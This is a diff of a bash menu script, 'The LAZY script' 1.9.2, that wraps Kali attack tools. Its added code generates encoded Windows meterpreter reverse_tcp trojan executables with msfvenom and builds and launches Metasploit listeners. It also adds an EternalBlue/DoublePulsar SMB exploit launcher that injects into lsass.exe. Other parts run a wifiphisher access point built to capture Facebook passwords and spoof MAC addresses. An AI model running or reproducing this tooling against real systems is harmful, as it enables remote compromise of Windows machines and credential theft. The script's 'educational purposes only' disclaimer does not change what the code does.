@@ -1,32 +1,33 @@
 #! /bin/bash
-VERSION=1.9.1
-HOWMANYTOOLS=21
+VERSION=1.9.2
+HOWMANYTOOLS=22
 BACKL="0"
 #############DEFAULTS###############
-TITLEBAR="The LAZY script"
+#TITLEBAR="The LAZY script"
 #setting yellow-start 
-YS="\e[1;33m"
+	YS="\e[1;33m"
 #setting color-end
-CE="\e[0m"
+	CE="\e[0m"
 #setting red-start
-RS="\e[1;31m"
+	RS="\e[1;31m"
 #setting frequent stings
-YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
-YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
-YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
-PAKT="Press "$YS"any key$CE to"
-PAKTC="Press "$YS"any key$CE to continue..."
-PAKTGB="Press "$YS"any key$CE to go back..."
-READAK="read -n 1 -r"
+	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
+	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
+	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
+	PAKT="Press "$YS"any key$CE to"
+	PAKTC="Press "$YS"any key$CE to continue..."
+	PAKTGB="Press "$YS"any key$CE to go back..."
+#code to read from keyboard without return
+	READAK="read -n 1 -r"
 #path for lscript
-LPATH="/root/lscript"
+	LPATH="/root/lscript"
 #path for keyboard shortcuts
-KSPATH=""$LPATH"/ks"
+	KSPATH=""$LPATH"/ks"
 #making sure the kspath is set
-if [ ! -d "$KSPATH" ]
-then
-	mkdir "$KSPATH"
-fi
+	if [ ! -d "$KSPATH" ]
+	then
+		mkdir "$KSPATH"
+	fi
 ##############FUNCTIONS#############
 function banner
 {
@@ -41,11 +42,11 @@ function banner
 	echo -e ""$YS" 1"$CE") Enable $WLANN                      "$YS"d1"$CE") Disable $WLANN"
 	echo -e ""$YS" 2"$CE") Enable $WLANNM                   "$YS"d2"$CE") Disable $WLANNM"
 	echo -e ""$YS" 3"$CE") Change MAC                        "$YS"d3"$CE") Restore original MAC"
-	if [ -d /opt/4nonimizer ]
+	if [ -f /usr/bin/anonym8 ]
 	then
-	echo -e ""$YS" 4"$CE") Enable 4nonimizer                 "$YS"d4"$CE") Disable 4nonimizer"
+	echo -e ""$YS" 4"$CE") Enable anonym8                    "$YS"d4"$CE") Disable anonym8"
 	else
-	echo -e ""$RS" 4"$CE") Enable 4nonimizer                 "$RS"d4"$CE") Disable 4nonimizer"
+	echo -e ""$RS" 4"$CE") Enable anonym8                    "$RS"d4"$CE") Disable anonym8"
 	fi
 	if [ -f /usr/bin/anonsurf ]
 	then
@@ -212,6 +213,7 @@ echo -e ""$YS"back"$CE") Go back"
 read CHECKKS
 if [ "$CHECKKS" == "back" ]
 then
+	clear
 	BACKKS=1
 else
 	BACKKS=0
@@ -236,7 +238,7 @@ then
 		echo -e "$PAKTGB"
 		$READAK
 		clear
-		break
+		#break
 	else
 		clear
 		echo -e "Removing shortcut for "$TITLE"..."
@@ -357,6 +359,11 @@ function listshortcuts
 		TITLE="TheFatRat"
 		NAMECD="cd /root/TheFatRat"
 		KSSET="./fatrat"
+	elif [ "$nn" = "22" ]
+	then
+		TITLE="Angry_IP_Scanner"
+		NAMECD=" "
+		KSSET="gnome-terminal --geometry 1x1+9999+9999 -e /usr/bin/ipscan & disown"
 	fi
 }
 function reinstall_tools
@@ -385,7 +392,7 @@ do
 	echo -e ""$YS"18"$CE") Katana Framework"
 	echo -e ""$YS"19"$CE") Airgeddon"				
 	echo -e ""$YS"20"$CE") Websploit"
-	echo -e ""$YS"21"$CE") 4nonimizer"
+	echo -e ""$YS"21"$CE") 4nonimizer       (not in TOOLS anymore)"
 	echo -e ""$YS"22"$CE") Openvas"
 	echo -e ""$YS"23"$CE") BeeLogger"
 	echo -e ""$YS"24"$CE") Ezsploit"
@@ -396,6 +403,7 @@ do
 	echo -e ""$YS"29"$CE") Anonsurf"
 	echo -e ""$YS"30"$CE") Anonym8"
 	echo -e ""$YS"31"$CE") TheFatRat"
+	echo -e ""$YS"32"$CE") Angry IP Scanner"
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS" 0"$CE") Exit"
 	echo -e "Choose: "
@@ -792,7 +800,7 @@ do
 		git clone https://github.com/HiroshiManRise/anonym8.git
 		cd anonym8
 		chmod +x INSTALL.sh
-		./INSTALL
+		./INSTALL.sh
 		sleep 1	
 	elif [ "$REIN" = "31" ]
 	then	
@@ -808,6 +816,22 @@ do
 		git clone https://github.com/Screetsec/TheFatRat.git
 		cd TheFatRat
 		chmod +x setup.sh && ./setup.sh	
+	elif [ "$REIN" = "32" ]
+	then
+		cd
+		if [ -f "/root/ipscan_*" ]
+		then
+			echo -e "Removing old file"
+			sleep 2
+			rm /root/ipscan_*
+		fi
+		echo -e "Downloading angryipscanner"
+		sleep 2
+		wget https://github.com/angryip/ipscan/releases/download/3.5.1/ipscan_3.5.1_amd64.deb
+		echo -e "Installing..."
+		dpkg -i ipscan_*
+		echo -e "Done"
+		sleep 1
 	elif [ "$REIN" = "back" ]
 	then
 		clear
@@ -966,8 +990,13 @@ then
 	read nn
 	clear
 	listshortcuts
+	if [ "$nn" = "" ]
+	then
+		continue
+	fi
 	if [ "$nn" = "back" ]
 	then
+		clear
 		break
 	elif [ "$nn" = "0" ]
 	then
@@ -990,6 +1019,7 @@ then
 elif [ "$KS" = "back" ]
 then
 	BACKL="1"
+	clear
 	break
 elif [ "$KS" = "0" ]
 then
@@ -1127,7 +1157,7 @@ then
 		export TARGIP
 		export PORTTCP
 		export PORTUDP
-		cd /root/lscript/ls
+		cd "$LPATH"/ls
 		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
 		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
 		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
@@ -1451,6 +1481,12 @@ function wifi_tools
 	else
 		echo -e ""$RS"22"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
 	fi
+	if [ -f /usr/bin/ipscan ]
+	then
+		echo -e ""$YS"23"$CE") Angry IP Scanner   IP Scanner"
+	else
+		echo -e ""$RS"23"$CE") "$RS"Angry IP Scanner"$CE"   IP Scanner"
+	fi
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS"00"$CE") Main menu"
 	#echo -e ""$YS" 0"$CE") EXIT"
@@ -1634,6 +1670,9 @@ function wifi_tools
 		else
 			openvas-stop
 		fi
+	elif [ "$APPP" = "23" ]
+	then
+		bash /usr/bin/ipscan & disown
 	elif [ "$APPP" = "6" ]
 	then
 		while true
@@ -1869,25 +1908,27 @@ function remote_access
 }
 function metasploit_menu
 {
-	if [ ! -d /root/lscript/rc ]
+	if [ ! -d "$LPATH"/rc ]
 	then
-		mkdir /root/lscript/rc
+		mkdir "$LPATH"/rc
 	fi
 	while true
 	do
 	clear
 	echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
 	printf '\033]2;METASPLOIT\a'
-	echo -e ""$YS" 1"$CE") Create payload"
+	echo -e ""$YS" 1"$CE") Create payload with msfvenom(windows/meterpreter/reverse_tcp)"
 	echo -e ""$YS" 2"$CE") Create listener"
 	echo -e ""$YS" 3"$CE") Saved listeners"
+	echo -e ""$YS" 4"$CE") Start msfconsole"
+	echo -e ""$YS" 5"$CE") Update msfconsole"
 	echo -e ""$YS"back"$CE") Go back"
 	echo -e ""$YS" 0"$CE") EXIT"
 	echo -e "Choose: "
 	read -e METASP
+	clear
 	if [ "$METASP" = "1" ]
 	then
-		clear
 		echo -e "Enter the attacker's IP: "
 		read ATIP
 		echo -e ""
@@ -1896,8 +1937,9 @@ function metasploit_menu
 		echo -e ""
 		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
 		read TARCH
-		echo -e "Enter the output path(etc "$YS"/root/Desktop/trojan.exe"$CE"): "
+		echo -e "Enter the name of the payload(etc "$YS"trojan2"$CE"): "
 		read ATEXE
+		ATEXEPATH="/root/Desktop/'$ATEXE'.exe"
 		clear
 		echo -e "Generating"
 		sleep 0.1
@@ -1912,11 +1954,40 @@ function metasploit_menu
 		echo .
 		sleep 0.1
 		echo .
-		msfvenom -p windows/meterpreter/reverse_tcp   --platform windows -a $TARCH -f exe LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXE"
+		if [ "$TARCH" = "x64" ]
+		then
+			msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
+		else
+			msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
+		fi
 		echo -e "Done."
 		echo -e ""
 		echo -e "$PAKTC"
 		$READAK
+		clear
+		echo -e "Create a listener for this payload? $YNYES "
+		read PAYL
+		if [ "$PAYL" != "n" ]
+		then
+			echo -e "Name of listener(etc: "$YS"john"$CE") : "
+			read NAMEL
+			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
+			echo "set PAYLOAD windows/meterpreter/reverse_tcp " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
+			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
+			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
+			clear
+			echo -e "Launch the listener now? "$YNONLY""
+			read LLN
+			if [ "$LLN" = "y" ]
+			then
+				echo -e "Launching msfconsole..."
+				sleep 2
+				clear
+				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
+			fi
+		fi
 	elif [ "$METASP" = "z" ]
 	then
 		clear
@@ -1947,12 +2018,12 @@ function metasploit_menu
 		fi
 		echo -e "Name of listener(etc: "$YS"john"$CE") : "
 		read NAMEL
-		echo "use exploit/multi/handler" > /root/lscript/rc/"$NAMEL".rc
-		echo "set PAYLOAD $PAYLOADL " >> /root/lscript/rc/"$NAMEL".rc
-		echo "set LHOST $LHOSTL " >> /root/lscript/rc/"$NAMEL".rc
-		echo "set LPORT $LPORTL " >> /root/lscript/rc/"$NAMEL".rc
-		echo "set ExitOnSession false" >> /root/lscript/rc/"$NAMEL".rc
-		echo "exploit -j" >> /root/lscript/rc/"$NAMEL".rc
+		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
+		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
+		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
+		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
+		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
+		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
 		clear
 		echo -e "Launch the listener now? "$YNONLY""
 		read LLN
@@ -1961,14 +2032,14 @@ function metasploit_menu
 			echo -e "Launching msfconsole..."
 			sleep 2
 			clear
-			msfconsole -r /root/lscript/rc/"$NAMEL".rc
+			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
 		fi
 	elif [ "$METASP" = "3" ]
 	then
 		while true
 		do
 		clear
-		ls /root/lscript/rc
+		ls "$LPATH"/rc
 		echo -e "Enter the name of the above listener(s) you want to select(etc: "$YS"john"$CE")"
 		echo -e ""$YS"back"$CE") Go back"
 		read NAMERC
@@ -1977,10 +2048,10 @@ function metasploit_menu
 		then
 			break
 		fi
-		if [ ! -f /root/lscript/rc/"$NAMERC" ]
+		if [ ! -f "$LPATH"/rc/"$NAMERC" ]
 		then
 			NAMERC="$NAMERC".rc
-			if [ ! -f /root/lscript/rc/"$NAMERC" ]
+			if [ ! -f "$LPATH"/rc/"$NAMERC" ]
 			then
 				echo -e "File not found. Try again.."
 				sleep 2
@@ -1998,10 +2069,10 @@ function metasploit_menu
 		read LISTL
 		if [ "$LISTL" = "1" ]
 		then
-			msfconsole -r /root/lscript/rc/"$NAMERC"
+			msfconsole -r "$LPATH"/rc/"$NAMERC"
 		elif [ "$LISTL" = "2" ]
 		then
-			rm /root/lscript/rc/"$NAMERC"
+			rm "$LPATH"/rc/"$NAMERC"
 			break
 		elif [ "$LISTL" = "back" ]
 		then
@@ -2009,13 +2080,18 @@ function metasploit_menu
 		fi
 		done
 		done
+	elif [ "$METASP" = "4" ]
+	then
+		msfconsole
+	elif [ "$METASP" = "5" ]
+	then
+		msfupdate
 	elif [ "$METASP" = "back" ]
 	then
 		BACKL="1"
 		break
 	elif [ "$METASP" = "00" ]
 	then
-		clear
 		exec bash "$0"
 	elif [ "$METASP" = "0" ]
 	then
@@ -2051,8 +2127,8 @@ function update_lscript
 			echo -e ""
 			echo -e "Moving lscript to lscriptold"
 			sleep 2
-			mv /root/lscript /root/lscriptold
-			echo -e "Cloning the latest github version to new /root/lscript"
+			mv "$LPATH" /root/lscriptold
+			echo -e "Cloning the latest github version to new "$LPATH""
 			sleep 2
 			cd
 			git clone https://github.com/arismelachroinos/lscript.git
@@ -2116,23 +2192,18 @@ function update_lscript
 function hidden_shortcuts
 {
 	clear
-	echo -e ""$YS"interface"$CE") Change your interface"
-	echo -e ""$YS"   wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
+	echo -e ""$YS"  interface"$CE") Change your interface"
+	echo -e ""$YS"     wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
+	echo -e ""$YS"eternalblue"$CE") Launch msfconsole with eternalblue exploit on target"
 	echo -e "$PAKTGB"
 	$READAK
 	clear
 }
-
-
-####################################
-printf '\033]2;The LAZY script\a'
-if [ "$ONETIMEPERLAUNCH" != "1" ]
-then
+function one_time_per_launch_ks
+{
 	if [ -d ""$KSPATH"/nums" ]
 	then
 		rm -r "$KSPATH"/nums
-	#~ else
-		#~ mkdir "$KSPATH"/nums
 	fi
 	mkdir "$KSPATH"/nums
 	nn=1
@@ -2152,6 +2223,196 @@ then
 
 	done
 	ONETIMEPERLAUNCH="1"
+}
+function interface_menu
+{
+	WLANN=$(cat "$LPATH"/wlan.txt)
+	WLANNM=$(cat "$LPATH"/wlanmon.txt)
+	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
+	sleep 2
+	echo -e "Do you want to change you interface names?"$YNYES": "
+	read INAG
+	if [ "$INAG" = "n" ]
+	then
+		clear
+		echo -e "Then why did you come here? lol"
+		sleep 3
+		exec bash "$0"
+	else
+		clear
+		rm "$LPATH"/wlan.txt
+		rm "$LPATH"/wlanmon.txt
+		set_interface_number
+	fi
+}
+function tools_menu
+{
+	while true
+	do
+	echo -e "------------------------------"$RS"TOOLS"$CE"------------------------------"
+	printf '\033]2;TOOLS\a'
+	echo -e ""$YS" 1"$CE") Wifi tools"
+	echo -e ""$YS" 2"$CE") Remote access"
+	echo -e ""$YS" 3"$CE") Install/reinstall a tool"
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS"00"$CE") Main menu"
+	echo -e ""$YS" 0"$CE") EXIT"
+	echo "Choose: "
+	read -e CATEG
+	clear
+		if [ "$CATEG" = "1" ]
+		then
+			wifi_tools
+		elif [ "$CATEG" = "2" ]
+		then
+			remote_access
+		elif [ "$CATEG" = "3" ]
+		then
+			reinstall_tools
+		elif [ "$CATEG" = "0" ]
+		then
+			clear
+			exit
+		elif [ "$CATEG" = "back" ]
+		then
+			BACKL="1"
+			break
+		elif [ "$CATEG" = "00" ]
+		then
+			clear
+			exec bash "$0"
+		fi
+	done
+}
+function public_ip
+{
+	clear
+	CHECKMON=$(ifconfig | grep "mon")
+	if [ "$CHECKMON" = "" ]
+	then
+		PUBLICIP=$(curl -s ipinfo.io/ip)
+		echo "Your public IP is: "$PUBLICIP""
+		#~ curl ipinfo.io/ip
+		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
+	else
+		echo -e "When monitor mode is enabled, you don't have internet access."
+		echo -e "Select 'd2' to disable monitor mode"
+		echo -e "$PAKTGB"
+		$READAK
+		clear
+		exec bash "$0"
+	fi
+}
+function terms_of_use
+{
+	printf '\033]2;TERMS OF USE\a'
+	echo -e "You need to accept the terms."
+	sleep 1
+	echo -e "$PAKTC"
+	$READAK
+	clear
+	echo -e "This tool is only for educational purposes only."
+	sleep 2
+	echo -e "Use this tool only on your own network and never without permission."
+	sleep 2
+	echo -e "I am not responsible for anything you do with this tool."
+	sleep 2
+	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
+	read YESORNO
+	if [ "$YESORNO" = "YES" ]
+	then 
+		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
+		sleep 1
+		clear
+	fi
+	exec bash "$0"
+}
+function eternalblue
+{
+	if [ ! -d "$LPATH"/rce ]
+	then
+		mkdir	"$LPATH"/rce
+	fi
+	echo -e "LHOST: "
+	read LHOSTL
+	echo -e "RHOST: "
+	read RHOSTL
+	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
+	read TARGETARCHL
+	if [ "$TARGETARCHL" = "x64" ]
+	then
+		PROCESSINJECTL="lsass.exe"
+		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
+	else
+		PAYLOADL="windows/meterpreter/reverse_tcp"
+	fi
+	echo -e "TARGET("$YS"1"$CE"-"$YS"8"$CE"): "
+	read TARGETL
+	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
+	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
+	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
+	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
+	
+}
+function start_menu
+{
+	echo -e "Enabling $WLANN..."
+	rfkill unblock wifi; rfkill unblock all
+	ifconfig $WLANN up
+	echo -e "$WLANN enabled"
+	echo -e "Enabling $WLANNM..."
+	echo -e "Killing services..."
+	airmon-ng check kill
+	echo -e "Done."
+	echo -e "Starting monitor mode..."
+	airmon-ng start $WLANN
+	echo -e "Done."
+	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
+	ifconfig $WLANNM down
+	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:"
+	ifconfig $WLANNM up
+	echo -e "Done."
+}
+function stop_menu
+{
+	echo -e "Changing mac address of $WLANNM to the original one..."
+	ifconfig $WLANNM down
+	macchanger -p $WLANNM
+	ifconfig $WLANNM up
+	echo -e "Disabling $WLANNM..."
+	echo -e "Stopping monitor mode..."
+	airmon-ng stop $WLANNM
+	echo -e "ok..."
+	echo -e "Starting network-manager service..."
+	service network-manager start
+	echo -e "ok..."
+	echo -e "Changing mac address of $WLANN to the original one..."
+	ifconfig $WLANN down
+	macchanger -p $WLANN
+	ifconfig $WLANN up
+	echo -e "Changing mac address of eth0 to the original one..."
+	ifconfig eth0 down
+	macchanger -p eth0
+	ifconfig eth0 up
+	echo -e "Done."
+	echo -e "SUCCESS!"
+}
+
+
+
+
+
+####################################
+printf '\033]2;The LAZY script\a'
+if [ "$ONETIMEPERLAUNCH" != "1" ]
+then
+	one_time_per_launch_ks
 fi
 ####################################
 if [ -f ""$LPATH"/IAGREE.txt" ]
@@ -2171,16 +2432,17 @@ banner
 var1=1
 	while [ $var1 -le $HOWMANY ]
 	do
-	read TITLE < "$KSPATH"/nums/"$var1".txt
-	read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
-	if [ "$YORNAA" = "$YORNAKS" ]
-	then
-	read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
-	read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
-	$COMMAND1
-	$COMMAND2
-	fi
-	var1=$(( var1+1 ))
+		read TITLE < "$KSPATH"/nums/"$var1".txt
+		read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
+		if [ "$YORNAA" = "$YORNAKS" ]
+		then
+			read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
+			read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
+			$COMMAND1
+			$COMMAND2
+			BACKL="1"
+		fi
+		var1=$(( var1+1 ))
 	done
 ####
 	if [ "$YORNAA" = "0" ]
@@ -2191,62 +2453,10 @@ var1=1
 		keyboard_shortcuts
 	elif [ "$YORNAA" = "interface" ]
 	then
-		WLANN=$(cat "$LPATH"/wlan.txt)
-		WLANNM=$(cat "$LPATH"/wlanmon.txt)
-		echo -e "Your current wireless interface names are $WLANN and $WLANNM"
-		sleep 2
-		echo -e "Do you want to change you interface names?"$YNYES": "
-		read INAG
-		if [ "$INAG" = "n" ]
-		then
-			clear
-			echo -e "Then why did you come here? lol"
-			sleep 3
-			exec bash "$0"
-		else
-			clear
-			rm "$LPATH"/wlan.txt
-			rm "$LPATH"/wlanmon.txt
-			set_interface_number
-		fi
+		interface_menu
 	elif [ "$YORNAA" = "9" ]
 	then
-		while true
-		do
-		echo -e "------------------------------"$RS"TOOLS"$CE"------------------------------"
-		printf '\033]2;TOOLS\a'
-		echo -e ""$YS" 1"$CE") Wifi tools"
-		echo -e ""$YS" 2"$CE") Remote access"
-		echo -e ""$YS" 3"$CE") Install/reinstall a tool"
-		echo -e ""$YS"back"$CE") Go back"
-		echo -e ""$YS"00"$CE") Main menu"
-		echo -e ""$YS" 0"$CE") EXIT"
-		echo "Choose: "
-		read -e CATEG
-		clear
-			if [ "$CATEG" = "1" ]
-			then
-				wifi_tools
-			elif [ "$CATEG" = "2" ]
-			then
-				remote_access
-			elif [ "$CATEG" = "3" ]
-			then
-				reinstall_tools
-			elif [ "$CATEG" = "0" ]
-			then
-				clear
-				exit
-			elif [ "$CATEG" = "back" ]
-			then
-				BACKL="1"
-				break
-			elif [ "$CATEG" = "00" ]
-			then
-				clear
-				exec bash "$0"
-			fi
-	done
+		tools_menu
 	elif [ "$YORNAA" = "l" ]
 	then
 		clear 
@@ -2330,13 +2540,13 @@ var1=1
 		echo -e "Done."
 	elif [ "$YORNAA" = "4" ]
 	then
-		echo -e "Enabling 4nonimizer..."
-		4nonimizer start
+		echo -e "Enabling anonym8..."
+		anonym8 start
 		echo -e "Done."
 	elif [ "$YORNAA" = "d4" ]
 	then
-		echo -e "Disabling 4nonimizer..."
-		4nonimizer stop
+		echo -e "Disabling anonym8..."
+		anonym8 stop
 		echo -e "Done."
 	elif [ "$YORNAA" = "5" ]
 	then
@@ -2365,22 +2575,7 @@ var1=1
 		echo -e "Done."
 	elif [ "$YORNAA" = "7" ]
 	then
-		clear
-		CHECKMON=$(ifconfig | grep "mon")
-		if [ "$CHECKMON" = "" ]
-		then
-			PUBLICIP=$(curl -s ipinfo.io/ip)
-			echo "Your public IP is: "$PUBLICIP""
-			#~ curl ipinfo.io/ip
-			#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
-		else
-			echo -e "When monitor mode is enabled, you don't have internet access."
-			echo -e "Select 'd2' to disable monitor mode"
-			echo -e "$PAKTGB"
-			$READAK
-			clear
-			exec bash "$0"
-		fi
+		public_ip
 	elif [ "$YORNAA" = "8" ]
 	then
 		interface_selection
@@ -2389,16 +2584,27 @@ var1=1
 		macchanger -s $MYINT
 	elif [ "$YORNAA" = "10" ]
 	then
+		while true
+		do
 		clear
 		CHECKMON=$(ifconfig | grep "mon")
 		if [ "$CHECKMON" = "" ]
 		then
 			echo -e "Monitor mode is not enabled."
-			echo -e "Select 'start' or '2' to enable it"
-			echo -e "$PAKTGB"
-			$READAK
-			clear
-			exec bash "$0"
+			echo -e ""
+			echo -e "Do you want to enable monitor mode? "$YNYES": "
+			read MONITOREN
+			if [ "$MONITOREN" = "n" ]
+			then
+			#~ echo -e "Select 'start' or '2' to enable it"
+				echo -e "$PAKTGB"
+				$READAK
+				clear
+				exec bash "$0"
+			else
+				start_menu
+				continue
+			fi
 		else
 			echo -e "Moving into new terminal..."
 			sleep 1
@@ -2407,20 +2613,32 @@ var1=1
 			gnome-terminal --geometry 87x35+9999+0 -e lh1
 			sleep 1
 			exec bash "$0"
-			#~ gnome-terminal --geometry 80x25+0+0 -e l
+			break
 		fi
+		done
 	elif [ "$YORNAA" = "11" ]
 	then
+		while true
+		do
 		clear
 		CHECKMON=$(ifconfig | grep "mon")
 		if [ "$CHECKMON" = "" ]
 		then
 			echo -e "Monitor mode is not enabled."
-			echo -e "Select 'start' or '2' to enable it"
-			echo -e "$PAKTGB"
-			$READAK
-			clear
-			exec bash "$0"
+			echo -e ""
+			echo -e "Do you want to enable monitor mode? "$YNYES": "
+			read MONITOREN
+			if [ "$MONITOREN" = "n" ]
+			then
+			#~ echo -e "Select 'start' or '2' to enable it"
+				echo -e "$PAKTGB"
+				$READAK
+				clear
+				exec bash "$0"
+			else
+				start_menu
+				continue
+			fi
 		else
 			clear
 			echo -e "Moving into new terminal..."
@@ -2428,26 +2646,41 @@ var1=1
 			gnome-terminal --geometry 80x25+9999+0 -e lh3
 			sleep 1
 			exec bash "$0"
+			break
 		fi
+		done
 	elif [ "$YORNAA" = "12" ]
 	then
+		while true
+		do
 		clear
 		CHECKMON=$(ifconfig | grep "mon")
 		if [ "$CHECKMON" = "" ]
 		then
 			echo -e "Monitor mode is not enabled."
-			echo -e "Select 'start' or '2' to enable it"
-			echo -e "$PAKTGB"
-			$READAK
-			clear
-			exec bash "$0"
+			echo -e ""
+			echo -e "Do you want to enable monitor mode? "$YNYES": "
+			read MONITOREN
+			if [ "$MONITOREN" = "n" ]
+			then
+			#~ echo -e "Select 'start' or '2' to enable it"
+				echo -e "$PAKTGB"
+				$READAK
+				clear
+				exec bash "$0"
+			else
+				start_menu
+				continue
+			fi
 		else
 			echo -e "Moving into new terminal..."
 			sleep 1
 			gnome-terminal --geometry 80x25+9999+0 -e lh4
 			sleep 1
 			exec bash "$0"
+			break
 		fi
+		done
 	elif [ "$YORNAA" = "13" ]
 	then
 		mitm_menu
@@ -2479,109 +2712,36 @@ var1=1
 	elif [ "$YORNAA" = "errors" ]
 	then
 		errors_menu
+	elif [ "$YORNAA" = "eternalblue" ]
+	then
+		eternalblue
 	elif [ "$YORNAA" = "wififb" ]
 	then
 		echo -e "Enter the name of the access point you want to create: "
 		read -e ESSIDAP
 		export ESSIDAP
-		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' 
+		xterm -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
 	elif [ "$YORNAA" = "start" ]
 	then		
-		echo -e "Enabling $WLANN..."
-		rfkill unblock wifi; rfkill unblock all
-		ifconfig $WLANN up
-		echo -e "$WLANN enabled"
-		echo -e "Enabling $WLANNM..."
-		echo -e "Killing services..."
-		airmon-ng check kill
-		echo -e "Done."
-		echo -e "Starting monitor mode..."
-		airmon-ng start $WLANN
-		echo -e "Done."
-		echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
-		ifconfig $WLANNM down
-		macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:"
-		ifconfig $WLANNM up
-		echo -e "Done."
-		echo -e "SUCCESS!"
+		start_menu
 #----------
-		elif [ "$YORNAA" = "stop" ]
-		then
-		echo -e "Changing mac address of $WLANNM to the original one..."
-		ifconfig $WLANNM down
-		macchanger -p $WLANNM
-		ifconfig $WLANNM up
-		echo -e "Disabling $WLANNM..."
-		echo -e "Stopping monitor mode..."
-		airmon-ng stop $WLANNM
-		echo -e "ok..."
-		echo -e "Starting network-manager service..."
-		service network-manager start
-		echo -e "ok..."
-		echo -e "Changing mac address of $WLANN to the original one..."
-		ifconfig $WLANN down
-		macchanger -p $WLANN
-		ifconfig $WLANN up
-		echo -e "Changing mac address of eth0 to the original one..."
-		ifconfig eth0 down
-		macchanger -p eth0
-		ifconfig eth0 up
-		echo -e "Done."
-		echo -e "SUCCESS!"
-		elif [ "$YORNAA" = "exit" ]
-		then
-			exit
-		#~ else
-			#~ clear
-			#~ echo -e "Wrong choice"
-			#~ $YORNAA
-			#~ sleep 0.3
-			#~ clear
-			#~ exec bash "$0"
-		fi
-if [ "$BACKL" = "1" ]
-then
-	exec bash "$0"
-	
-else
-	echo -e "$PAKTGB"
-	$READAK
-	exec bash "$0"
-fi
-#~ echo -e "Choose again?"$YNYES": "
-#~ read -e YORNLAST
-#~ if [ -z "$YORNLAST" ]
-#~ then
-	#~ clear
-	#~ exec bash "$0"
-#~ elif [ "$YORNLAST" = "y" ]
-#~ then
-	#~ clear
-	#~ exec bash "$0"
-#~ else 
-	#~ clear
-	#~ exit
-#~ fi
-else
-	printf '\033]2;TERMS OF USE\a'
-	echo -e "You need to accept the terms."
-	sleep 1
-	echo -e "$PAKTC"
-	$READAK
-	clear
